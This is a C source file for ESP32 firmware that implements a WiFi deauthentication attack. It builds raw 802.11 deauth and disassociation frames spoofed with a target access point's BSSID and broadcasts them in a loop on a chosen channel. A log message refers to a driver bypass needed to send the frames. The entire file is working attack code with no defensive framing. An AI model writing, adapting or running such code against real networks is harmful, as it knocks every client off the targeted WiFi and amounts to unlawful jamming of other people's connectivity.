#include "attack_deauth.h"
#include "wifi_controller.h"
#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_wifi.h"

static const char *TAG = "DEAUTH_ATTACK";

static bool attack_active = false;
static TaskHandle_t deauth_task_handle = NULL;
static uint8_t target_bssid[6];
static char target_str[18] = {0};
static bool tx_error_logged = false;

/* Deauth: FC=0xC0, reason=7 (class 3 frame left) */
static const uint8_t deauth_template[] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* DA broadcast */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* SA = AP BSSID */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* BSSID */
    0x07, 0x00
};

/* Disassoc: FC=0xA0 */
static const uint8_t disassoc_template[] = {
    0xA0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x07, 0x00
};

static esp_err_t send_mgmt_frame(const uint8_t *template_frame, size_t len) {
    uint8_t frame[26];
    if (len > sizeof(frame)) {
        return ESP_ERR_INVALID_SIZE;
    }
    memcpy(frame, template_frame, len);
    memcpy(&frame[10], target_bssid, 6);
    memcpy(&frame[16], target_bssid, 6);

    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, true);
    if (ret != ESP_OK) {
        ret = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true);
    }
    return ret;
}

static void deauth_task(void *pvParameters) {
    tx_error_logged = false;

    while (attack_active) {
        esp_err_t ret1 = send_mgmt_frame(deauth_template, sizeof(deauth_template));
        esp_err_t ret2 = send_mgmt_frame(disassoc_template, sizeof(disassoc_template));

        if (ret1 != ESP_OK && ret2 != ESP_OK && !tx_error_logged) {
            ESP_LOGW(TAG, "Frame send failed: %s (need wsl_bypass / rebuild)",
                     esp_err_to_name(ret1));
            tx_error_logged = true;
        }

        vTaskDelay(pdMS_TO_TICKS(100));
    }

    deauth_task_handle = NULL;
    vTaskDelete(NULL);
}

void deauth_attack_init(void) {
    ESP_LOGI(TAG, "Deauth attack module initialized");
}

void start_deauth_attack(const uint8_t *bssid, int channel) {
    if (!bssid) {
        return;
    }

    if (attack_active) {
        stop_deauth_attack();
    }

    memcpy(target_bssid, bssid, 6);
    snprintf(target_str, sizeof(target_str), MACSTR, MAC2STR(bssid));
    if (channel < 1 || channel > 14) {
        ESP_LOGW(TAG, "Invalid channel %d", channel);
        return;
    }
esp_wifi_set_channel((uint8_t)channel,
                     WIFI_SECOND_CHAN_NONE);    attack_active = true;
    if (xTaskCreate(deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle) != pdPASS) {
        attack_active = false;
        deauth_task_handle = NULL;
        ESP_LOGE(TAG, "Failed to start deauth task");
        return;
    }
    ESP_LOGI(TAG, "Started deauth on " MACSTR " ch %d", MAC2STR(bssid), channel);
}

void stop_deauth_attack(void) {
    if (!attack_active) {
        return;
    }
    attack_active = false;
    for (int i = 0; i < 30 && deauth_task_handle != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    ESP_LOGI(TAG, "Stopped deauth attack");
}

bool is_attack_active(void) {
    return attack_active;
}

void get_attack_target(char *buffer) {
    if (buffer) {
        strncpy(buffer, target_str, 17);
        buffer[17] = '\0';
    }
}
